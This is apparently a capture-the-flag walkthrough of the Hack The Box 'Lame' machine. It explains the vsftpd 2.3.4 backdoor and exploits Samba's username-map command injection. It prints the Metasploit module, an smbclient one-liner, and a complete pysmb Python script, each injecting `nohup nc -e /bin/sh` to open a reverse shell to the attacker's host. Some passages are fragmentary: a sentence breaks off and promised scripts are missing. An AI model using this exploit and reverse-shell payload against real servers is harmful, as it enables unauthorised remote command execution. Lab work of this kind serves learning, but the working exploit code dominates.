> **VSFTPD v2.3.4 Backdoor Command Execution — Rapid7**
>
> In July 2011, version 2.3.4 of the vsftpd (Very Secure FTP Daemon) software was
> found to contain a malicious backdoor (CVE-2011-2523), commonly referred to as
> the "Smiley Face" backdoor. This version was briefly compromised and
> distributed on the main download site between June 30 and July 3, 2011.

### Samba usermap injection (manual exploitation)

To understand the exploit process, we inspect the Metasploit module found earlier
using searchsploit's `-x` flag. This shows the function being defined and how it
passes a payload in the username field on a connection attempt.

```ruby
def exploit
    connect
    # lol?
    username = "/=`nohup " + payload.encoded + "`"
    begin
        simple.client.negotiate(false)
        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
        # nothing, it either worked or it didn't ;)
    end
```

The error occurs because of the Samba username-map function and ultimately leads
to command injection: the username is passed to the shell, and because it
contains backticks, the string is executed as command substitution in Unix-like
shells.

> **Note — what was `samba_usermap` meant to do?**
>
> Early Samba supported a feature called username mapping: "when a client logs in
> as X, map them to local Unix user Y." This existed because Windows usernames
> aren't Unix usernames, admins needed flexibility, and central auth systems were
> messy in the early 2000s. So Samba provided a configuration option (username
> map) and a helper mechanism to transform usernames.

The injection persists because it calls `nohup` (which starts the process outside
the current context) and then executes the reverse-shell payload. This means once
the SMB session terminates, the reverse shell is not closed. Now that we
understand the process, we can attempt to exploit it manually.

We try **smbclient**, but see it excutes locally: using the command
with backticks leads to command substitution and starts a shell back to
our own Kali machine.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Lame]
└─$ smbclient //10.129.42.133/tmp -U "./=`nohup nc -e /bin/sh 10.10.15.155 443`"

nohup: ignoring input and redirecting stderr to stdout   # (1: nohup run locally)

Password for [.\=]:                                       # (4: flow resumes back to SMB connection)

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Lame]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.155] from (UNKNOWN) [10.10.15.155] 58610   # (2: local callback on our own Kali)

^C   # (3: session terminated)
```

We swap the double quotes for single quotes, which makes some progress — but now

## Python scripting

Now that we've identified the vulnerability and how to trigger it, we have two
further options: repurpose openly available scripts, or write our own. In this
lab we'll do both — first using a downloaded script, then dissecting it to build
our own.

### Downloaded scripts

We can manually exploit the target using openly available Python 2 scripts. The
two below require only minor edits and environment configuration, and are
slightly more technical than Metasploit's auto-pwn.

```python
buf += "\x31\x30\x2e\x31\x35\x2e\x31\x35\x35\x20\x34\x34"
```

### Creating our own tool

Having dissected several existing tools and proof-of-concept exploits, we can now
create our own minimal script to reproduce the attack. Rather than relying on
Metasploit, `smbmap`, or public exploit code, we'll interact with the vulnerable
SMB service directly using the `pysmb` library.

We keep the script intentionally simple, incorporating only the components we
identified during earlier analysis. As shown previously, injecting a command
terminated with the `` ` `` character lets us break out of the intended execution
flow, while prepending the payload with `nohup` ensures the spawned process
survives after the SMB authentication session ends. Here, the payload establishes
a netcat reverse shell back to our attacking host, giving command execution on
the target.

```python
#!/usr/bin/python
from smb.SMBConnection import SMBConnection

# Variable declarations
server_ip = "10.129.42.133"   # Hard-coded target address
username = "./=`nohup nc -e /bin/sh 10.10.15.155 443`"   # Hard-coded callback IP and port
password = ""

# Connection details
conn = SMBConnection(
    username,
    password,
    "kali",        # Client name (can be anything)
    "lame",        # Server name (can be anything, but NOT empty)
    use_ntlm_v2=False   # SMB1 servers often require this
)

connected = conn.connect(server_ip, 445)

# Error handling
if connected:
    print("Authenticated successfully")
else:
    print("Authentication failed")

conn.close()
```

Running the exploit works, which means we've made the effort to build our own
tool and understand the exploit rather than just running someone else's.

```bash

└─$ python hippo.py
```
